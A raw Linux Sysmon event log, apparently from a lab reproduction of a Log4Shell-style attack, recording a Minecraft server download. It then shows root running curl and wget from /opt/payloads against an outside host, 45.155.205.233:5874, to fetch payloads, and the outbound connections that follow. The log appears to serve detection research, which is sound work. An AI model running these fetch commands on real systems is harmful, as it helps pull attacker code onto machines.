<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>3</EventID><Version>5</Version><Level>4</Level><Task>3</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2021-12-10T03:39:06.147165000Z"/><EventRecordID>22702045</EventRecordID><Correlation/><Execution ProcessID="4406" ThreadID="4406"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-8267</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2021-12-10 03:39:06.152</Data><Data Name="ProcessGuid">{ec2d99e9-cbda-61b2-708c-f9fc5d550000}</Data><Data Name="ProcessId">891</Data><Data Name="Image">/usr/bin/wget</Data><Data Name="User">root</Data><Data Name="Protocol">udp</Data><Data Name="Initiated">true</Data><Data Name="SourceIsIpv6">false</Data><Data Name="SourceIp">127.0.0.1</Data><Data Name="SourceHostname">-</Data><Data Name="SourcePort">52688</Data><Data Name="SourcePortName">-</Data><Data Name="DestinationIsIpv6">false</Data><Data Name="DestinationIp">127.0.0.53</Data><Data Name="DestinationHostname">-</Data><Data Name="DestinationPort">53</Data><Data Name="DestinationPortName">-</Data></EventData></Event>
<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>3</EventID><Version>5</Version><Level>4</Level><Task>3</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2021-12-10T03:39:06.148013000Z"/><EventRecordID>22702049</EventRecordID><Correlation/><Execution ProcessID="4406" ThreadID="4406"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-8267</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2021-12-10 03:39:06.154</Data><Data Name="ProcessGuid">{ec2d99e9-cbda-61b2-708c-f9fc5d550000}</Data><Data Name="ProcessId">891</Data><Data Name="Image">/usr/bin/wget</Data><Data Name="User">root</Data><Data Name="Protocol">udp</Data><Data Name="Initiated">false</Data><Data Name="SourceIsIpv6">false</Data><Data Name="SourceIp">127.0.0.53</Data><Data Name="SourceHostname">-</Data><Data Name="SourcePort">53</Data><Data Name="SourcePortName">-</Data><Data Name="DestinationIsIpv6">false</Data><Data Name="DestinationIp">127.0.0.1</Data><Data Name="DestinationHostname">-</Data><Data Name="DestinationPort">52688</Data><Data Name="DestinationPortName">-</Data></EventData></Event>
<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2021-12-10T16:48:18.175501000Z"/><EventRecordID>24499162</EventRecordID><Correlation/><Execution ProcessID="4406" ThreadID="4406"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-8267</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2021-12-10 16:48:18.181</Data><Data Name="ProcessGuid">{ec2d99e9-84d2-61b3-70cc-980e18560000}</Data><Data Name="ProcessId">2592</Data><Data Name="Image">/usr/bin/wget</Data><Data Name="FileVersion">-</Data><Data Name="Description">-</Data><Data Name="Product">-</Data><Data Name="Company">-</Data><Data Name="OriginalFileName">-</Data><Data Name="CommandLine">wget minecraft_server.1.18.1.jar</Data><Data Name="CurrentDirectory">/opt</Data><Data Name="User">root</Data><Data Name="LogonGuid">{ec2d99e9-0000-0000-0000-000000000000}</Data><Data Name="LogonId">0</Data><Data Name="TerminalSessionId">218</Data><Data Name="IntegrityLevel">no level</Data><Data Name="Hashes">-</Data><Data Name="ParentProcessGuid">{ec2d99e9-84ba-61b3-08b4-3e70a3550000}</Data><Data Name="ParentProcessId">2580</Data><Data Name="ParentImage">/bin/bash</Data><Data Name="ParentCommandLine">bash</Data><Data Name="ParentUser">root</Data></EventData></Event>
<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>3</EventID><Version>5</Version><Level>4</Level><Task>3</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2021-12-10T16:48:18.178783000Z"/><EventRecordID>24499169</EventRecordID><Correlation/><Execution ProcessID="4406" ThreadID="4406"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-8267</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2021-12-10 16:48:18.184</Data><Data Name="ProcessGuid">{ec2d99e9-84d2-61b3-70cc-980e18560000}</Data><Data Name="ProcessId">2592</Data><Data Name="Image">/usr/bin/wget</Data><Data Name="User">root</Data><Data Name="Protocol">udp</Data><Data Name="Initiated">true</Data><Data Name="SourceIsIpv6">false</Data><Data Name="SourceIp">127.0.0.1</Data><Data Name="SourceHostname">-</Data><Data Name="SourcePort">59326</Data><Data Name="SourcePortName">-</Data><Data Name="DestinationIsIpv6">false</Data><Data Name="DestinationIp">127.0.0.53</Data><Data Name="DestinationHostname">-</Data><Data Name="DestinationPort">53</Data><Data Name="DestinationPortName">-</Data></EventData></Event>
<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>3</EventID><Version>5</Version><Level>4</Level><Task>3</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2021-12-10T16:48:18.202026000Z"/><EventRecordID>24499174</EventRecordID><Correlation/><Execution ProcessID="4406" ThreadID="4406"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-8267</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2021-12-10 16:48:18.208</Data><Data Name="ProcessGuid">{ec2d99e9-84d2-61b3-70cc-980e18560000}</Data><Data Name="ProcessId">2592</Data><Data Name="Image">/usr/bin/wget</Data><Data Name="User">root</Data><Data Name="Protocol">udp</Data><Data Name="Initiated">false</Data><Data Name="SourceIsIpv6">false</Data><Data Name="SourceIp">127.0.0.53</Data><Data Name="SourceHostname">-</Data><Data Name="SourcePort">53</Data><Data Name="SourcePortName">-</Data><Data Name="DestinationIsIpv6">false</Data><Data Name="DestinationIp">127.0.0.1</Data><Data Name="DestinationHostname">-</Data><Data Name="DestinationPort">59326</Data><Data Name="DestinationPortName">-</Data></EventData></Event>
<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>3</EventID><Version>5</Version><Level>4</Level><Task>3</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2021-12-10T16:48:18.212967000Z"/><EventRecordID>24499175</EventRecordID><Correlation/><Execution ProcessID="4406" ThreadID="4406"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-8267</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2021-12-10 16:48:18.219</Data><Data Name="ProcessGuid">{ec2d99e9-84d2-61b3-70cc-980e18560000}</Data><Data Name="ProcessId">2592</Data><Data Name="Image">/usr/bin/wget</Data><Data Name="User">root</Data><Data Name="Protocol">udp</Data><Data Name="Initiated">true</Data><Data Name="SourceIsIpv6">false</Data><Data Name="SourceIp">127.0.0.1</Data><Data Name="SourceHostname">-</Data><Data Name="SourcePort">52025</Data><Data Name="SourcePortName">-</Data><Data Name="DestinationIsIpv6">false</Data><Data Name="DestinationIp">127.0.0.53</Data><Data Name="DestinationHostname">-</Data><Data Name="DestinationPort">53</Data><Data Name="DestinationPortName">-</Data></EventData></Event>
<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>5</EventID><Version>3</Version><Level>4</Level><Task>5</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2021-12-10T16:48:18.218681000Z"/><EventRecordID>24499179</EventRecordID><Correlation/><Execution ProcessID="4406" ThreadID="4406"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-8267</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2021-12-10 16:48:18.225</Data><Data Name="ProcessGuid">{ec2d99e9-84d2-61b3-70cc-980e18560000}</Data><Data Name="ProcessId">2592</Data><Data Name="Image">/usr/bin/wget</Data><Data Name="User">root</Data></EventData></Event>
<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2021-12-10T16:48:26.139381000Z"/><EventRecordID>24499481</EventRecordID><Correlation/><Execution ProcessID="4406" ThreadID="4406"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-8267</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2021-12-10 16:48:26.145</Data><Data Name="ProcessGuid">{ec2d99e9-84da-61b3-707c-2459f9550000}</Data><Data Name="ProcessId">2593</Data><Data Name="Image">/usr/bin/wget</Data><Data Name="FileVersion">-</Data><Data Name="Description">-</Data><Data Name="Product">-</Data><Data Name="Company">-</Data><Data Name="OriginalFileName">-</Data><Data Name="CommandLine">wget https://launcher.mojang.com/v1/objects/125e5adf40c659fd3bce3e66e67a16bb49ecc1b9/server.jar</Data><Data Name="CurrentDirectory">/opt</Data><Data Name="User">root</Data><Data Name="LogonGuid">{ec2d99e9-0000-0000-0000-000000000000}</Data><Data Name="LogonId">0</Data><Data Name="TerminalSessionId">218</Data><Data Name="IntegrityLevel">no level</Data><Data Name="Hashes">-</Data><Data Name="ParentProcessGuid">{ec2d99e9-84ba-61b3-08b4-3e70a3550000}</Data><Data Name="ParentProcessId">2580</Data><Data Name="ParentImage">/bin/bash</Data><Data Name="ParentCommandLine">bash</Data><Data Name="ParentUser">root</Data></EventData></Event>
<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>3</EventID><Version>5</Version><Level>4</Level><Task>3</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2021-12-10T16:48:26.143473000Z"/><EventRecordID>24499482</EventRecordID><Correlation/><Execution ProcessID="4406" ThreadID="4406"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-8267</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2021-12-10 16:48:26.149</Data><Data Name="ProcessGuid">{ec2d99e9-84da-61b3-707c-2459f9550000}</Data><Data Name="ProcessId">2593</Data><Data Name="Image">/usr/bin/wget</Data><Data Name="User">root</Data><Data Name="Protocol">udp</Data><Data Name="Initiated">true</Data><Data Name="SourceIsIpv6">false</Data><Data Name="SourceIp">127.0.0.1</Data><Data Name="SourceHostname">-</Data><Data Name="SourcePort">41963</Data><Data Name="SourcePortName">-</Data><Data Name="DestinationIsIpv6">false</Data><Data Name="DestinationIp">127.0.0.53</Data><Data Name="DestinationHostname">-</Data><Data Name="DestinationPort">53</Data><Data Name="DestinationPortName">-</Data></EventData></Event>
<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>3</EventID><Version>5</Version><Level>4</Level><Task>3</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2021-12-10T16:48:26.152946000Z"/><EventRecordID>24499486</EventRecordID><Correlation/><Execution ProcessID="4406" ThreadID="4406"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-8267</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2021-12-10 16:48:26.159</Data><Data Name="ProcessGuid">{ec2d99e9-84da-61b3-707c-2459f9550000}</Data><Data Name="ProcessId">2593</Data><Data Name="Image">/usr/bin/wget</Data><Data Name="User">root</Data><Data Name="Protocol">udp</Data><Data Name="Initiated">false</Data><Data Name="SourceIsIpv6">false</Data><Data Name="SourceIp">127.0.0.53</Data><Data Name="SourceHostname">-</Data><Data Name="SourcePort">53</Data><Data Name="SourcePortName">-</Data><Data Name="DestinationIsIpv6">false</Data><Data Name="DestinationIp">127.0.0.1</Data><Data Name="DestinationHostname">-</Data><Data Name="DestinationPort">41963</Data><Data Name="DestinationPortName">-</Data></EventData></Event>
<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>3</EventID><Version>5</Version><Level>4</Level><Task>3</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2021-12-10T16:48:26.166431000Z"/><EventRecordID>24499488</EventRecordID><Correlation/><Execution ProcessID="4406" ThreadID="4406"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-8267</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2021-12-10 16:48:26.172</Data><Data Name="ProcessGuid">{ec2d99e9-84da-61b3-707c-2459f9550000}</Data><Data Name="ProcessId">2593</Data><Data Name="Image">/usr/bin/wget</Data><Data Name="User">root</Data><Data Name="Protocol">tcp</Data><Data Name="Initiated">true</Data><Data Name="SourceIsIpv6">false</Data><Data Name="SourceIp">10.0.1.25</Data><Data Name="SourceHostname">-</Data><Data Name="SourcePort">36998</Data><Data Name="SourcePortName">-</Data><Data Name="DestinationIsIpv6">false</Data><Data Name="DestinationIp">54.192.72.20</Data><Data Name="DestinationHostname">-</Data><Data Name="DestinationPort">443</Data><Data Name="DestinationPortName">-</Data></EventData></Event>
<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>11</EventID><Version>2</Version><Level>4</Level><Task>11</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2021-12-10T16:48:26.190302000Z"/><EventRecordID>24499489</EventRecordID><Correlation/><Execution ProcessID="4406" ThreadID="4406"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-8267</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2021-12-10 16:48:26.196</Data><Data Name="ProcessGuid">{ec2d99e9-84da-61b3-707c-2459f9550000}</Data><Data Name="ProcessId">2593</Data><Data Name="Image">/usr/bin/wget</Data><Data Name="TargetFilename">/opt/server.jar</Data><Data Name="CreationUtcTime">2021-12-10 16:48:26.196</Data><Data Name="User">root</Data></EventData></Event>
<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>5</EventID><Version>3</Version><Level>4</Level><Task>5</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2021-12-10T16:48:26.460869000Z"/><EventRecordID>24499490</EventRecordID><Correlation/><Execution ProcessID="4406" ThreadID="4406"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-8267</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2021-12-10 16:48:26.467</Data><Data Name="ProcessGuid">{ec2d99e9-84da-61b3-707c-2459f9550000}</Data><Data Name="ProcessId">2593</Data><Data Name="Image">/usr/bin/wget</Data><Data Name="User">root</Data></EventData></Event>
<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>3</EventID><Version>5</Version><Level>4</Level><Task>3</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2021-12-10T16:52:19.050842000Z"/><EventRecordID>24519510</EventRecordID><Correlation/><Execution ProcessID="4406" ThreadID="4406"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-8267</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2021-12-10 16:52:19.057</Data><Data Name="ProcessGuid">{ec2d99e9-85b3-61b3-709c-46bc0d560000}</Data><Data Name="ProcessId">5169</Data><Data Name="Image">/usr/bin/wget</Data><Data Name="User">root</Data><Data Name="Protocol">tcp</Data><Data Name="Initiated">true</Data><Data Name="SourceIsIpv6">false</Data><Data Name="SourceIp">10.0.1.25</Data><Data Name="SourceHostname">-</Data><Data Name="SourcePort">60652</Data><Data Name="SourcePortName">-</Data><Data Name="DestinationIsIpv6">false</Data><Data Name="DestinationIp">54.171.230.55</Data><Data Name="DestinationHostname">-</Data><Data Name="DestinationPort">443</Data><Data Name="DestinationPortName">-</Data></EventData></Event>
<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>5</EventID><Version>3</Version><Level>4</Level><Task>5</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2021-12-10T16:52:32.219332000Z"/><EventRecordID>24520686</EventRecordID><Correlation/><Execution ProcessID="4406" ThreadID="4406"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-8267</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2021-12-10 16:52:32.225</Data><Data Name="ProcessGuid">{ec2d99e9-85b3-61b3-709c-46bc0d560000}</Data><Data Name="ProcessId">5169</Data><Data Name="Image">/usr/bin/wget</Data><Data Name="User">root</Data></EventData></Event>
<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2021-12-10T17:03:14.328144000Z"/><EventRecordID>24549998</EventRecordID><Correlation/><Execution ProcessID="4406" ThreadID="4406"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-8267</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2021-12-10 17:03:14.333</Data><Data Name="ProcessGuid">{ec2d99e9-8852-61b3-785d-5260cd550000}</Data><Data Name="ProcessId">7385</Data><Data Name="Image">/usr/bin/curl</Data><Data Name="FileVersion">-</Data><Data Name="Description">-</Data><Data Name="Product">-</Data><Data Name="Company">-</Data><Data Name="OriginalFileName">-</Data><Data Name="CommandLine">curl -s 45.155.205.233:5874/104.214.103.78:80</Data><Data Name="CurrentDirectory">/opt/payloads</Data><Data Name="User">root</Data><Data Name="LogonGuid">{ec2d99e9-0000-0000-0000-000000000000}</Data><Data Name="LogonId">0</Data><Data Name="TerminalSessionId">219</Data><Data Name="IntegrityLevel">no level</Data><Data Name="Hashes">-</Data><Data Name="ParentProcessGuid">{ec2d99e9-8796-61b3-08c4-2a1dfd550000}</Data><Data Name="ParentProcessId">7371</Data><Data Name="ParentImage">/bin/bash</Data><Data Name="ParentCommandLine">bash</Data><Data Name="ParentUser">root</Data></EventData></Event>
<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>3</EventID><Version>5</Version><Level>4</Level><Task>3</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2021-12-10T17:03:14.541154000Z"/><EventRecordID>24549999</EventRecordID><Correlation/><Execution ProcessID="4406" ThreadID="4406"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-8267</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2021-12-10 17:03:14.547</Data><Data Name="ProcessGuid">{ec2d99e9-8852-61b3-785d-5260cd550000}</Data><Data Name="ProcessId">7385</Data><Data Name="Image">/usr/bin/curl</Data><Data Name="User">root</Data><Data Name="Protocol">tcp</Data><Data Name="Initiated">true</Data><Data Name="SourceIsIpv6">false</Data><Data Name="SourceIp">10.0.1.25</Data><Data Name="SourceHostname">-</Data><Data Name="SourcePort">54712</Data><Data Name="SourcePortName">-</Data><Data Name="DestinationIsIpv6">false</Data><Data Name="DestinationIp">45.155.205.233</Data><Data Name="DestinationHostname">-</Data><Data Name="DestinationPort">5874</Data><Data Name="DestinationPortName">-</Data></EventData></Event>
<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>5</EventID><Version>3</Version><Level>4</Level><Task>5</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2021-12-10T17:03:14.813669000Z"/><EventRecordID>24550038</EventRecordID><Correlation/><Execution ProcessID="4406" ThreadID="4406"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-8267</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2021-12-10 17:03:14.820</Data><Data Name="ProcessGuid">{ec2d99e9-8852-61b3-785d-5260cd550000}</Data><Data Name="ProcessId">7385</Data><Data Name="Image">/usr/bin/curl</Data><Data Name="User">root</Data></EventData></Event>
<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2021-12-10T17:03:21.232853000Z"/><EventRecordID>24550579</EventRecordID><Correlation/><Execution ProcessID="4406" ThreadID="4406"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-8267</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2021-12-10 17:03:21.238</Data><Data Name="ProcessGuid">{ec2d99e9-8859-61b3-785d-af70fc550000}</Data><Data Name="ProcessId">7388</Data><Data Name="Image">/usr/bin/curl</Data><Data Name="FileVersion">-</Data><Data Name="Description">-</Data><Data Name="Product">-</Data><Data Name="Company">-</Data><Data Name="OriginalFileName">-</Data><Data Name="CommandLine">curl -s 45.155.205.233:5874</Data><Data Name="CurrentDirectory">/opt/payloads</Data><Data Name="User">root</Data><Data Name="LogonGuid">{ec2d99e9-0000-0000-0000-000000000000}</Data><Data Name="LogonId">0</Data><Data Name="TerminalSessionId">219</Data><Data Name="IntegrityLevel">no level</Data><Data Name="Hashes">-</Data><Data Name="ParentProcessGuid">{ec2d99e9-8796-61b3-08c4-2a1dfd550000}</Data><Data Name="ParentProcessId">7371</Data><Data Name="ParentImage">/bin/bash</Data><Data Name="ParentCommandLine">bash</Data><Data Name="ParentUser">root</Data></EventData></Event>
<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>3</EventID><Version>5</Version><Level>4</Level><Task>3</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2021-12-10T17:03:22.457682000Z"/><EventRecordID>24550652</EventRecordID><Correlation/><Execution ProcessID="4406" ThreadID="4406"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-8267</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2021-12-10 17:03:22.463</Data><Data Name="ProcessGuid">{ec2d99e9-8859-61b3-785d-af70fc550000}</Data><Data Name="ProcessId">7388</Data><Data Name="Image">/usr/bin/curl</Data><Data Name="User">root</Data><Data Name="Protocol">tcp</Data><Data Name="Initiated">true</Data><Data Name="SourceIsIpv6">false</Data><Data Name="SourceIp">10.0.1.25</Data><Data Name="SourceHostname">-</Data><Data Name="SourcePort">54718</Data><Data Name="SourcePortName">-</Data><Data Name="DestinationIsIpv6">false</Data><Data Name="DestinationIp">45.155.205.233</Data><Data Name="DestinationHostname">-</Data><Data Name="DestinationPort">5874</Data><Data Name="DestinationPortName">-</Data></EventData></Event>
<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>5</EventID><Version>3</Version><Level>4</Level><Task>5</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2021-12-10T17:03:22.663032000Z"/><EventRecordID>24550687</EventRecordID><Correlation/><Execution ProcessID="4406" ThreadID="4406"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-8267</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2021-12-10 17:03:22.669</Data><Data Name="ProcessGuid">{ec2d99e9-8859-61b3-785d-af70fc550000}</Data><Data Name="ProcessId">7388</Data><Data Name="Image">/usr/bin/curl</Data><Data Name="User">root</Data></EventData></Event>
<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2021-12-10T17:03:37.751893000Z"/><EventRecordID>24550858</EventRecordID><Correlation/><Execution ProcessID="4406" ThreadID="4406"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-8267</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2021-12-10 17:03:37.757</Data><Data Name="ProcessGuid">{ec2d99e9-8869-61b3-709c-6d7571550000}</Data><Data Name="ProcessId">7390</Data><Data Name="Image">/usr/bin/wget</Data><Data Name="FileVersion">-</Data><Data Name="Description">-</Data><Data Name="Product">-</Data><Data Name="Company">-</Data><Data Name="OriginalFileName">-</Data><Data Name="CommandLine">wget -q -O- 45.155.205.233:5874</Data><Data Name="CurrentDirectory">/opt/payloads</Data><Data Name="User">root</Data><Data Name="LogonGuid">{ec2d99e9-0000-0000-0000-000000000000}</Data><Data Name="LogonId">0</Data><Data Name="TerminalSessionId">219</Data><Data Name="IntegrityLevel">no level</Data><Data Name="Hashes">-</Data><Data Name="ParentProcessGuid">{ec2d99e9-8796-61b3-08c4-2a1dfd550000}</Data><Data Name="ParentProcessId">7371</Data><Data Name="ParentImage">/bin/bash</Data><Data Name="ParentCommandLine">bash</Data><Data Name="ParentUser">root</Data></EventData></Event>
<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>3</EventID><Version>5</Version><Level>4</Level><Task>3</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2021-12-10T17:03:37.960910000Z"/><EventRecordID>24550859</EventRecordID><Correlation/><Execution ProcessID="4406" ThreadID="4406"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-8267</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2021-12-10 17:03:37.967</Data><Data Name="ProcessGuid">{ec2d99e9-8869-61b3-709c-6d7571550000}</Data><Data Name="ProcessId">7390</Data><Data Name="Image">/usr/bin/wget</Data><Data Name="User">root</Data><Data Name="Protocol">tcp</Data><Data Name="Initiated">true</Data><Data Name="SourceIsIpv6">false</Data><Data Name="SourceIp">10.0.1.25</Data><Data Name="SourceHostname">-</Data><Data Name="SourcePort">54728</Data><Data Name="SourcePortName">-</Data><Data Name="DestinationIsIpv6">false</Data><Data Name="DestinationIp">45.155.205.233</Data><Data Name="DestinationHostname">-</Data><Data Name="DestinationPort">5874</Data><Data Name="DestinationPortName">-</Data></EventData></Event>
<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>5</EventID><Version>3</Version><Level>4</Level><Task>5</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2021-12-10T17:03:38.168307000Z"/><EventRecordID>24550864</EventRecordID><Correlation/><Execution ProcessID="4406" ThreadID="4406"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-8267</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2021-12-10 17:03:38.174</Data><Data Name="ProcessGuid">{ec2d99e9-8869-61b3-709c-6d7571550000}</Data><Data Name="ProcessId">7390</Data><Data Name="Image">/usr/bin/wget</Data><Data Name="User">root</Data></EventData></Event>
<Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2021-12-10T17:09:24.225353000Z"/><EventRecordID>24559349</EventRecordID><Correlation/><Execution ProcessID="4406" ThreadID="4406"/><Channel>Linux-Sysmon/Operational</Channel><Computer>sysmonlinux-8267</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2021-12-10 17:09:24.231</Data><Data Name="ProcessGuid">{ec2d99e9-89c4-61b3-782d-a4dc76550000}</Data><Data Name="ProcessId">7401</Data><Data Name="Image">/usr/bin/curl</Data><Data Name="FileVersion">-</Data><Data Name="Description">-</Data><Data Name="Product">-</Data><Data Name="Company">-</Data><Data Name="OriginalFileName">-</Data><Data Name="CommandLine">curl -s 45.155.205.233:5874</Data><Data Name="CurrentDirectory">/opt/payloads</Data><Data Name="User">root</Data><Data Name="LogonGuid">{ec2d99e9-0000-0000-0000-000000000000}</Data><Data Name="LogonId">0</Data><Data Name="TerminalSessionId">219</Data><Data Name="IntegrityLevel">no level</Data><Data Name="Hashes">-</Data><Data Name="ParentProcessGuid">{ec2d99e9-8796-61b3-08c4-2a1dfd550000}</Data><Data Name="ParentProcessId">7371</Data><Data 